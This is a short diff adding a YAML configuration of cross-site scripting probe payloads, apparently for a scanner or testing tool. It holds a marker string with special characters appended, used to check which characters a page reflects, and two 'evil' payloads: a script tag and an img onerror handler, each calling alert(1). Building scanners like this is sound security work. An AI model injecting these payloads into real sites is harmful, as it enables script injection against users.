@@ -1,0 +1,16 @@
+payloads:
+  normal:
+    text: mxss07mH
+    "'": mxss07mH'
+    '"': mxss07mH"
+    <: mxss07mH<
+    ">": mxss07mH>
+    "&#x;": mxss07mH&#x28;
+    (: mxss07mH(
+    ): mxss07mH)
+    <>: mxss07mH<i>
+    (): mxss07mH(i)
+    jsfuck: mxss07mH!+()[]
+  evil:
+    - <script>alert(1)</script>
+    - <img src=1 onerror=alert(1)>
